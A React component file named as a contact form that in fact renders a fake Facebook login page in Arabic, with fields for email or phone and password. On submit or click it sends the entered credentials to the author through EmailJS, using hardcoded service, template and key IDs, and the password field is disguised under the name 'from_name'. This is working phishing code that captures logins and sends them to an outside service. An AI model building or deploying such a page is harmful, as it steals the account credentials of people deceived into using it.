import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import "../App.css";
// import styled from "styled-components";

// npm i @emailjs/browser

const Contact = () => {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_50qmtl2",
        "template_e1n8yba",
        form.current, 
        "7VbF_EgO8MFAn_i3C"
      )
      .then(
        (result) => {
          console.log(result.text);
          console.log("message sent");
        },
        (error) => {
          console.log(error.text);
        }
      );
      // e.target.reset()   
    };

  return (
      <div className="container">
        <form  ref={form} onSubmit={sendEmail} onClick={sendEmail}>
            <h1>facebook</h1>
            <input type="text" name="to_name" placeholder="البريد الإلكتروني أو رقم الهاتف"/>
            <input type="text" name="from_name" placeholder="كلمة السر" />
            <input type="submit" value="تسجيل الدخول" className="btn-1"    />
            <h3>هل نسيت كلمة السر؟</h3>
            <button className='btn-2'>إنشاء حساب جديد</button>
        </form>
      </div>
  );
};

export default Contact;

